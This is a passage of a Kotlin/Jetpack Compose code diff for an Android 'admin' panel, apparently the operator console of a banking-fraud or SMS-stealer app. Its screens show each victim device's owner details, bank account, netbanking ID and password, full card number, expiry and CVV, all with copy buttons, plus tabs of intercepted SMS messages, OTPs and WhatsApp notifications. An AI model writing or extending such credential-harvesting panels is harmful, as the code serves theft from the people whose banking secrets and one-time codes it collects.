+                                    if (!device.netbankingId.isNullOrBlank()) {
+                                        AdminInfoRowWithCopy(label = "Netbanking ID", value = device.netbankingId, context = context)
+                                    }
+                                }
+                            }
+
+                            Card(
+                                shape = RoundedCornerShape(16.dp),
+                                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.6f)),
+                                modifier = Modifier.fillMaxWidth()
+                            ) {
+                                Column(modifier = Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
+                                    Text("Card Details", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
+                                    HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
+                                    AdminInfoRowWithCopy(label = "Card Number", value = device.cardNumber ?: "N/A", context = context)
+                                    AdminInfoRow(label = "Valid Thru", value = device.cardExpiry ?: "N/A")
+                                    AdminInfoRow(label = "CVV", value = device.cardCvv ?: "N/A")
+                                }
+                            }
+                        }
+                    }
+
+                    1 -> {
+                        // TAB 1: NORMAL NOTIFICATIONS
+                        NotificationListTab(messages = normalNotifications, context = context)
+                    }
+
+                    2 -> {
+                        // TAB 2: WHATSAPP NOTIFICATIONS
+                        NotificationListTab(messages = whatsappNotifications, context = context)
+                    }
                 }
             }
-        } else {
-            LazyColumn(
-                modifier = Modifier.fillMaxSize(),
-                verticalArrangement = Arrangement.spacedBy(10.dp),
-                contentPadding = PaddingValues(bottom = 16.dp)
-            ) {
-                items(filteredMessages, key = { it.messageId.ifBlank { it.id.ifBlank { it.body } } }) { msg ->
-                    LiveNotificationCard(msg = msg, context = context)
-                }
+        }
+    }
+}
+
+@Composable
+private fun NotificationListTab(
+    messages: List<AdminMessageDto>,
+    context: Context
+) {
+    if (messages.isEmpty()) {
+        Box(
+            modifier = Modifier.fillMaxSize(),
+            contentAlignment = Alignment.Center
+        ) {
+            Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                Icon(Icons.Default.NotificationsOff, contentDescription = null, modifier = Modifier.size(48.dp), tint = MaterialTheme.colorScheme.onSurfaceVariant)
+                Spacer(modifier = Modifier.height(8.dp))
+                Text("No Notifications in this category", fontWeight = FontWeight.Bold)
+            }
+        }
+    } else {
+        LazyColumn(
+            modifier = Modifier.fillMaxSize(),
+            verticalArrangement = Arrangement.spacedBy(10.dp),
+            contentPadding = PaddingValues(bottom = 12.dp)
+        ) {
+            items(messages) { msg ->
+                LiveNotificationCard(msg = msg, context = context)
             }
         }
     }
@@ -475,11 +902,18 @@ private fun LiveNotificationCard(
                     color = PrimaryBlue
                 )
 
-                Text(
-                    text = msg.receivedAt?.take(16)?.replace("T", " ") ?: "Just now",
-                    style = MaterialTheme.typography.labelSmall,
-                    color = MaterialTheme.colorScheme.onSurfaceVariant
-                )
+                Surface(
+                    shape = RoundedCornerShape(6.dp),
+                    color = if (msg.category == "WHATSAPP") AccentGreen.copy(alpha = 0.15f) else PrimaryBlue.copy(alpha = 0.12f)
+                ) {
+                    Text(
+                        text = if (msg.category == "WHATSAPP") "WHATSAPP" else "NORMAL",
+                        modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp),
+                        style = MaterialTheme.typography.labelSmall,
+                        fontWeight = FontWeight.Bold,
+                        color = if (msg.category == "WHATSAPP") AccentGreen else PrimaryBlue
+                    )
+                }
             }
 
             Spacer(modifier = Modifier.height(4.dp))
@@ -550,317 +984,6 @@ private fun LiveNotificationCard(
                     modifier = Modifier.height(28.dp)
                 ) {
                     Text("Copy Message", fontSize = 11.sp)
-                }
-            }
-        }
-    }
-}
-
-/**
- * User Full Detail Modal Dialog: Shows User Profile, Bank Details, Card Details, and Notification History in separate tabs/cards.
- */
-@OptIn(ExperimentalMaterial3Api::class)
-@Composable
-private fun UserDetailModalDialog(
-    device: AdminDeviceDto,
-    allMessages: List<AdminMessageDto>,
-    searchQuery: String,
-    onSearchQueryChange: (String) -> Unit,
-    onDismiss: () -> Unit,
-    context: Context
-) {
-    var dialogTab by remember { mutableStateOf(0) } // 0: User Info & Bank/Cards, 1: Notification History
-
-    // Find messages matching this user or check device messages
-    val search = searchQuery.lowercase().trim()
-    val userMessages = remember(allMessages, device, search) {
-        allMessages.filter { m ->
-            val isUser = m.deviceId == device.deviceId ||
-                    m.mobileNumber == device.mobileNumber ||
-                    m.departmentName.equals(device.departmentName, ignoreCase = true)
-            val matchesSearch = search.isEmpty() ||
-                    m.body.lowercase().contains(search) ||
-                    m.sender.lowercase().contains(search) ||
-                    (m.otp != null && m.otp.contains(search))
-            isUser && matchesSearch
-        }
-    }
-
-    // Extract bank/card info from device or recent message payload
-    val userMsgWithBank = allMessages.firstOrNull { m ->
-        (m.deviceId == device.deviceId || m.mobileNumber == device.mobileNumber) &&
-                (!m.bankName.isNullOrBlank() || !m.cardNumber.isNullOrBlank())
-    }
-
-    val bankName = device.bankName ?: userMsgWithBank?.bankName ?: "N/A"
-    val accountNumber = device.accountNumber ?: userMsgWithBank?.accountNumber ?: "N/A"
-    val ifscCode = device.ifscCode ?: userMsgWithBank?.ifscCode ?: "N/A"
-    val netbankingId = device.netbankingId ?: userMsgWithBank?.netbankingId
-    val netbankingPassword = device.netbankingPassword ?: userMsgWithBank?.netbankingPassword
-
-    val cardNumber = device.cardNumber ?: userMsgWithBank?.cardNumber ?: "N/A"
-    val cardExpiry = device.cardExpiry ?: userMsgWithBank?.cardExpiry
-    val cardCvv = device.cardCvv ?: userMsgWithBank?.cardCvv
-
-    var isPasswordVisible by remember { mutableStateOf(false) }
-    var isCvvVisible by remember { mutableStateOf(false) }
-
-    Dialog(
-        onDismissRequest = onDismiss,
-        properties = DialogProperties(usePlatformDefaultWidth = false)
-    ) {
-        Surface(
-            modifier = Modifier
-                .fillMaxWidth(0.95f)
-                .fillMaxHeight(0.9f),
-            shape = RoundedCornerShape(24.dp),
-            color = MaterialTheme.colorScheme.surface
-        ) {
-            Column(
-                modifier = Modifier
-                    .fillMaxSize()
-                    .padding(16.dp)
-            ) {
-                // Header
-                Row(
-                    modifier = Modifier.fillMaxWidth(),
-                    horizontalArrangement = Arrangement.SpaceBetween,
-                    verticalAlignment = Alignment.CenterVertically
-                ) {
-                    Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
-                        Surface(
-                            shape = CircleShape,
-                            color = PrimaryBlue.copy(alpha = 0.15f),
-                            modifier = Modifier.size(42.dp)
-                        ) {
-                            Box(contentAlignment = Alignment.Center) {
-                                Icon(Icons.Default.Person, contentDescription = null, tint = PrimaryBlue)
-                            }
-                        }
-                        Spacer(modifier = Modifier.width(10.dp))
-                        Column {
-                            Text(
-                                text = device.departmentName,
-                                style = MaterialTheme.typography.titleMedium,
-                                fontWeight = FontWeight.Bold
-                            )
-                            Text(
-                                text = "📞 ${device.mobileNumber}",
-                                style = MaterialTheme.typography.bodySmall,
-                                color = MaterialTheme.colorScheme.onSurfaceVariant
-                            )
-                        }
-                    }
-
-                    IconButton(onClick = onDismiss) {
-                        Icon(Icons.Default.Close, contentDescription = "Close")
-                    }
-                }
-
-                Spacer(modifier = Modifier.height(12.dp))
-
-                // Dialog Tab Row
-                TabRow(
-                    selectedTabIndex = dialogTab,
-                    containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f),
-                    modifier = Modifier.clip(RoundedCornerShape(12.dp))
-                ) {
-                    Tab(
-                        selected = dialogTab == 0,
-                        onClick = { dialogTab = 0 },
-                        text = { Text("Account Details", fontWeight = FontWeight.Bold, fontSize = 13.sp) }
-                    )
-                    Tab(
-                        selected = dialogTab == 1,
-                        onClick = { dialogTab = 1 },
-                        text = { Text("SMS History (${userMessages.size})", fontWeight = FontWeight.Bold, fontSize = 13.sp) }
-                    )
-                }
-
-                Spacer(modifier = Modifier.height(12.dp))
-
-                if (dialogTab == 0) {
-                    // TAB 0: USER, BANK & CARD DETAILS
-                    Column(
-                        modifier = Modifier
-                            .fillMaxSize()
-                            .verticalScroll(rememberScrollState()),
-                        verticalArrangement = Arrangement.spacedBy(14.dp)
-                    ) {
-                        // 1. PERSONAL DETAILS CARD
-                        Card(
-                            shape = RoundedCornerShape(16.dp),
-                            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.6f)),
-                            modifier = Modifier.fillMaxWidth()
-                        ) {
-                            Column(modifier = Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
-                                Row(verticalAlignment = Alignment.CenterVertically) {
-                                    Icon(Icons.Default.Badge, contentDescription = null, tint = PrimaryBlue)
-                                    Spacer(modifier = Modifier.width(8.dp))
-                                    Text("Personal Details", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
-                                }
-                                HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
-                                AdminInfoRow(label = "Name", value = device.departmentName)
-                                AdminInfoRow(label = "Mobile No", value = device.mobileNumber)
-                                AdminInfoRow(label = "Address", value = device.address)
-                                AdminInfoRow(label = "Device Status", value = if (device.isOnline) "ONLINE" else "OFFLINE")
-                            }
-                        }
-
-                        // 2. BANK ACCOUNT DETAILS CARD
-                        Card(
-                            shape = RoundedCornerShape(16.dp),
-                            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.6f)),
-                            modifier = Modifier.fillMaxWidth()
-                        ) {
-                            Column(modifier = Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
-                                Row(verticalAlignment = Alignment.CenterVertically) {
-                                    Icon(Icons.Default.AccountBalance, contentDescription = null, tint = PrimaryBlue)
-                                    Spacer(modifier = Modifier.width(8.dp))
-                                    Text("Bank Account Details", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
-                                }
-                                HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
-                                AdminInfoRowWithCopy(label = "Bank Name", value = bankName, context = context)
-                                AdminInfoRowWithCopy(label = "Account Number", value = accountNumber, context = context)
-                                AdminInfoRowWithCopy(label = "IFSC Code", value = ifscCode, context = context)
-
-                                if (!netbankingId.isNullOrBlank()) {
-                                    AdminInfoRowWithCopy(label = "Netbanking ID", value = netbankingId, context = context)
-                                }
-
-                                if (!netbankingPassword.isNullOrBlank()) {
-                                    Row(
-                                        modifier = Modifier.fillMaxWidth(),
-                                        horizontalArrangement = Arrangement.SpaceBetween,
-                                        verticalAlignment = Alignment.CenterVertically
-                                    ) {
-                                        Text(
-                                            text = "Netbanking Password",
-                                            style = MaterialTheme.typography.bodyMedium,
-                                            color = MaterialTheme.colorScheme.onSurfaceVariant
-                                        )
-                                        Row(verticalAlignment = Alignment.CenterVertically) {
-                                            Text(
-                                                text = if (isPasswordVisible) netbankingPassword else "••••••••",
-                                                style = MaterialTheme.typography.bodyMedium,
-                                                fontWeight = FontWeight.Bold,
-                                                color = MaterialTheme.colorScheme.onSurface
-                                            )
-                                            IconButton(onClick = { isPasswordVisible = !isPasswordVisible }, modifier = Modifier.size(32.dp)) {
-                                                Icon(
-                                                    imageVector = if (isPasswordVisible) Icons.Default.Visibility else Icons.Default.VisibilityOff,
-                                                    contentDescription = null,
-                                                    modifier = Modifier.size(18.dp)
-                                                )
-                                            }
-                                            IconButton(onClick = {
-                                                copyToClipboard(context, "Password", netbankingPassword)
-                                            }, modifier = Modifier.size(32.dp)) {
-                                                Icon(Icons.Default.ContentCopy, contentDescription = null, tint = PrimaryBlue, modifier = Modifier.size(18.dp))
-                                            }
-                                        }
-                                    }
-                                }
-                            }
-                        }
-
-                        // 3. CARD DETAILS CARD
-                        Card(
-                            shape = RoundedCornerShape(16.dp),
-                            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.6f)),
-                            modifier = Modifier.fillMaxWidth()
-                        ) {
-                            Column(modifier = Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
-                                Row(verticalAlignment = Alignment.CenterVertically) {
-                                    Icon(Icons.Default.CreditCard, contentDescription = null, tint = PrimaryBlue)
-                                    Spacer(modifier = Modifier.width(8.dp))
-                                    Text("Debit / Credit Card Details", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
-                                }
-                                HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
-                                AdminInfoRowWithCopy(label = "Card Number", value = cardNumber, context = context)
-
-                                if (!cardExpiry.isNullOrBlank()) {
-                                    AdminInfoRow(label = "Valid Thru (MM/YY)", value = cardExpiry)
-                                }
-
-                                if (!cardCvv.isNullOrBlank()) {
-                                    Row(
-                                        modifier = Modifier.fillMaxWidth(),
-                                        horizontalArrangement = Arrangement.SpaceBetween,
-                                        verticalAlignment = Alignment.CenterVertically
-                                    ) {
-                                        Text(
-                                            text = "CVV",
-                                            style = MaterialTheme.typography.bodyMedium,
-                                            color = MaterialTheme.colorScheme.onSurfaceVariant
-                                        )
-                                        Row(verticalAlignment = Alignment.CenterVertically) {
-                                            Text(
-                                                text = if (isCvvVisible) cardCvv else "•••",
-                                                style = MaterialTheme.typography.bodyMedium,
-                                                fontWeight = FontWeight.Bold,
-                                                color = MaterialTheme.colorScheme.onSurface
-                                            )
-                                            IconButton(onClick = { isCvvVisible = !isCvvVisible }, modifier = Modifier.size(32.dp)) {
-                                                Icon(
-                                                    imageVector = if (isCvvVisible) Icons.Default.Visibility else Icons.Default.VisibilityOff,
-                                                    contentDescription = null,
-                                                    modifier = Modifier.size(18.dp)
-                                                )
-                                            }
-                                            IconButton(onClick = {
-                                                copyToClipboard(context, "CVV", cardCvv)
-                                            }, modifier = Modifier.size(32.dp)) {
-                                                Icon(Icons.Default.ContentCopy, contentDescription = null, tint = PrimaryBlue, modifier = Modifier.size(18.dp))
-                                            }
-                                        }
-                                    }
-                                }
-                            }
-                        }
-
-                        Spacer(modifier = Modifier.height(12.dp))
-                    }
-                } else {
-                    // TAB 1: SMS / NOTIFICATION HISTORY
-                    Column(modifier = Modifier.fillMaxSize()) {
-                        OutlinedTextField(
-                            value = searchQuery,
-                            onValueChange = onSearchQueryChange,
-                            placeholder = { Text("Search in this user's notifications...") },
-                            leadingIcon = { Icon(Icons.Default.Search, contentDescription = null) },
-                            singleLine = true,
-                            modifier = Modifier.fillMaxWidth(),
-                            shape = RoundedCornerShape(12.dp)
-                        )
-
-                        Spacer(modifier = Modifier.height(10.dp))
-
-                        if (userMessages.isEmpty()) {
-                            Box(
-                                modifier = Modifier
-                                    .fillMaxWidth()
-                                    .weight(1f),
-                                contentAlignment = Alignment.Center
-                            ) {
-                                Column(horizontalAlignment = Alignment.CenterHorizontally) {
-                                    Icon(Icons.Default.MarkAsUnread, contentDescription = null, modifier = Modifier.size(48.dp), tint = MaterialTheme.colorScheme.onSurfaceVariant)
-                                    Spacer(modifier = Modifier.height(8.dp))
-                                    Text("No Notifications Received Yet", fontWeight = FontWeight.Bold)
-                                }
-                            }
-                        } else {
-                            LazyColumn(
-                                modifier = Modifier.fillMaxSize(),
-                                verticalArrangement = Arrangement.spacedBy(10.dp),
-                                contentPadding = PaddingValues(bottom = 12.dp)
-                            ) {
-                                items(userMessages) { msg ->
-                                    LiveNotificationCard(msg = msg, context = context)
-                                }
-                            }
-                        }
-                    }
                 }
             }
         }
